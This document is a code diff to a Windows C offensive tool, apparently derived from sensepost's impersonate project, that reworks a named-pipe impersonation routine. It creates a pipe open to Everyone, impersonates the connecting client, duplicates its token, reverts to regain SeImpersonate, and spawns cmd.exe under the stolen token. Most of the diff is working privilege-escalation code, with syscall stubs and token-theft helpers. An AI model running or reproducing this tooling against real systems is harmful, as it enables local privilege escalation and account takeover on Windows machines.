@@ -8,13 +8,14 @@
 #include <securitybaseapi.h>
 #include <tlhelp32.h>
 #include <stdio.h>
+#include <sddl.h>
 
 #include "syscalls.h"
 
 #define BUFFER_SIZE 0x10
 
 // -----------------------------------------------------------------------------------------------------------------
-// Some of this code is from https://github.com/sensepost/impersonate
+// CREDIT: Some of this code is from https://github.com/sensepost/impersonate
 // ------------------------------------------------------------------------------------------------------------------
 
 #define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
@@ -85,55 +86,115 @@ typedef struct _Token {
 
 // ------------------------------------------------------------------------------------------------------------------
 
+void run_cmd(Token* tokenToUse, const wchar_t* cmdToRun)
+{
+    HANDLE pNewToken;
+    if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, tokenToUse->tokenType, &pNewToken))
+    {
+        DWORD LastError = GetLastError();
+        wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
+        CloseHandle(tokenToUse->tokenHandle);
+        return;
+    }
+
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, cmdToRun, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    {
+        printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
+    }
+
+    CloseHandle(tokenToUse->tokenHandle);
+    CloseHandle(pNewToken);
+}
+
+BOOL run_pipe_server() 
+{
+    SECURITY_ATTRIBUTES sa;
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    char buffer[256] = { 0 };
+    DWORD dwRead = 0;
+    DWORD bytesToRead = 1;
+    LPWSTR pipeName = L"\\\\.\\pipe\\TestPipe";
+
+    if (!InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION))
+    {
+        printf("[!] Error: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
+    {
+        printf("[!] Error: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    HANDLE hPipe = CreateNamedPipeW(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 256 * sizeof(char), 256 * sizeof(char), NMPWAIT_USE_DEFAULT_WAIT, &sa);
+
+    printf("[*] Named pipe %ws set up. Waiting for client to connect...\n", pipeName);
+
+    if (ConnectNamedPipe(hPipe, NULL))
+    {
+        printf("[*] Got connection!\n");
+
+        if (!PeekNamedPipe(hPipe, &buffer, (256-1) * sizeof(char), &dwRead, &bytesToRead, NULL))
+        {
+            printf("[!] Failed to read from pipe: %d\n", GetLastError());
+            return FALSE;
+        }
+
+        if (!ImpersonateNamedPipeClient(hPipe)) 
+        {
+            printf("[!] Failed to impersonate the client: %d\n", GetLastError());
+            return FALSE;
+        }
+
+        HANDLE hToken;
+        if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hToken))
+        {
+            printf("[*] Got token... opening cmd.exe\n");
+
+            HANDLE pNewToken;
+            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pNewToken))
+            {
+                printf("[!] ERROR: Could not duplicate token: %d\n", GetLastError());
+                CloseHandle(hToken);
+                return FALSE;
+            }
+
+            // Revert to self to re-gain SeImpersonate priv
+            RevertToSelf();
+            
+            STARTUPINFO si2;
+            PROCESS_INFORMATION pi2;
+            if (!CreateProcessWithTokenW(pNewToken, 0, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2))
+            {
+                printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
+                return FALSE;
+            }
+
+            return TRUE;
+        }
+
+        printf("[*] Could not get token: %d\n", GetLastError());
+        return FALSE;
+    }
+}
+
 BOOL setup_pipe_and_impersonate()
 {
-    LPCWSTR pipeName = L"\\\\.\\pipe\\TestPipe";
-    HANDLE hPipe;
+    DWORD dwThreadId1 = 0;
+    HANDLE hThread = CreateThread(NULL, 0, run_pipe_server, NULL, 0, &dwThreadId1);
+    DWORD dwWait = WaitForSingleObject(hThread, 120 * 100);
 
-    printf("[*] Setting up pipe %ws and waiting for client to connect...\n", pipeName);
-
-    hPipe = CreateNamedPipe(
-        pipeName, 
-        PIPE_ACCESS_DUPLEX,       
-        PIPE_TYPE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL
-    );
-
-    if (ConnectNamedPipe(hPipe, NULL))   // wait for someone to connect to the pipe
+    if (dwWait != WAIT_OBJECT_0)
     {
-        char buffer[1024] = {0};
-        DWORD dwRead = 0;
-
-        if (!ReadFile(hPipe, &buffer, 1, &dwRead, NULL)) // Read from pipe to be able to impersonate its client
-        {
-            printf("Could not read from pipe: %d\n", GetLastError());
-            return FALSE;
-        }
-
-        if (!ImpersonateNamedPipeClient(hPipe))
-        {
-            printf("Impersonating error: %d\n", GetLastError());
-            return FALSE;
-        }
-
-        STARTUPINFO si;
-        PROCESS_INFORMATION pi;
-        HANDLE pNewToken;
-        if (!DuplicateTokenEx(GetCurrentThreadToken(), TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pNewToken))
-        {
-            DWORD LastError = GetLastError();
-            wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
-            return FALSE; // impersonation state did not change
-        }
-        if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
-        {
-            printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
-        }
-
-        RevertToSelf();
-        CloseHandle(pNewToken);
-        DisconnectNamedPipe(hPipe);
-        return TRUE;
+        printf("[!] Timeout \n");
+        return FALSE;
     }
+
+    return TRUE;
 }
 
 BOOL impersonate(Token* tokenToUse)
@@ -157,28 +218,6 @@ BOOL impersonate(Token* tokenToUse)
     CloseHandle(tokenToUse->tokenHandle);
     CloseHandle(pNewToken);
     return TRUE;
-}
-
-void run_cmd(Token* tokenToUse, const wchar_t* cmdToRun)
-{
-    HANDLE pNewToken;
-    if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, tokenToUse->tokenType, &pNewToken))
-    {
-        DWORD LastError = GetLastError();
-        wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
-        CloseHandle(tokenToUse->tokenHandle);
-        return;
-    }
-
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, cmdToRun, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
-    {
-        printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
-    }
-
-    CloseHandle(tokenToUse->tokenHandle);
-    CloseHandle(pNewToken);
 }
 
 LPWSTR get_object_info(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass)
